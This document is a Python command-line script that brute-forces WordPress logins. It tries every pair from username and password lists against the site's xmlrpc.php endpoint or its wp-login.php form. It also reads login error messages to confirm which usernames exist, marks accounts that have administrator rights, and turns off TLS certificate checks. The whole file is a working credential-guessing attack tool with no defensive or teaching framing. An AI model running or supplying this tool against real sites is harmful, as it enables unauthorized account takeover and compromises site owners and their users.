#!/usr/bin/python3

import requests
import argparse
import xml.etree.ElementTree as ET

def info(string):
    if args.verbose:
        print(string.replace("\n",""))
def xml_rpc_api():
    founds = []
    headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
    }
    for username in username_list:
        for password in password_list:
            data = f'<methodCall> \r\n<methodName>wp.getUsersBlogs</methodName> \r\n<params> \r\n<param><value>{username}</value></param> \r\n<param><value>{password}</value></param> \r\n</params> \r\n</methodCall>'
            r = S.post(args.url+'/xmlrpc.php', headers=headers, data=data, verify=False)
            if r.status_code == 405:
                print('XML-RPC services are disabled on this site.')
                exit()
            if 'Incorrect username or password.' in r.text:
                #print('Incorrect username or password.')
                info(f"[-] Tryed: {username} : {password}")
                pass
            else:
                target = f"{username} : {password}"
                info(f"[+] Find: {target}")
                tree = ET.ElementTree(ET.fromstring(r.content))
                root = tree.getroot()
                #print([elem.text for elem in root.iter('name')][0])
                role = [elem.text for elem in root.iter('boolean')][0]
                if int(role) == 1:
                    info(f'[!] User {username} is Admin')
                    target += " - is Admin"
                founds.append(target.replace("\n",""))
    return founds


def loginPage():
    founds = []
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    for username in username_list:
        for password in password_list:
            data = {
                'log':username,
                'pwd':password,
                'wp-submit':'Login In'
            }
            r = S.post(args.url+'/wp-login.php', headers=headers, data=data, verify=False)
            info(f"[-] Tryed: {username} : {password}")
            if 'The password you entered for the username' in r.text:
                target = f"{username} is valide"
                info(f"[#] Valide: {username}")
                founds.append(target.replace("\n",""))
            elif 'not registered' not in r.text:
                target = f"{username} : {password}"
                info(f"[+] Find: {target}")
                if 'plugins.php' in r.text:
                    info(f'[!] User {username} is Admin')
                    target += " - is Admin"
                founds.append(target.replace("\n",""))
    return founds

def main():
    print(f"Using {args.methode}")
    print("")
    if args.methode == 'xmlrpc':
        print(xml_rpc_api())
    else:
        print(loginPage())

if __name__ == '__main__':
    global S
    parser = argparse.ArgumentParser(description = '')
    group_user = parser.add_mutually_exclusive_group(required=True)
    group_password = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('--url', required=True, type=str)
    group_user.add_argument('-u', '--userlist', type=str)
    group_user.add_argument('-U', '--user', type=str)
    group_password.add_argument('-p', '--passwordlist', type=str)
    group_password.add_argument('-P', '--password', type=str)
    parser.add_argument('-m', '--methode', choices=['xmlrpc','loginpage'], type=str, default='loginpage',help='Choose xmlrpc or loginpage (=Default)')
    parser.add_argument('-v', '--verbose', action=argparse.BooleanOptionalAction, default=False)

    args = parser.parse_args()

    S = requests.session()
    if args.user:
        username_list = [args.user]
    elif args.userlist:
        f = open(args.userlist,"r")
        username_list = f.readlines()
    if args.password:
        password_list = [args.password]
    elif args.passwordlist:
        f = open(args.passwordlist,"r")
        password_list = f.readlines()

    main()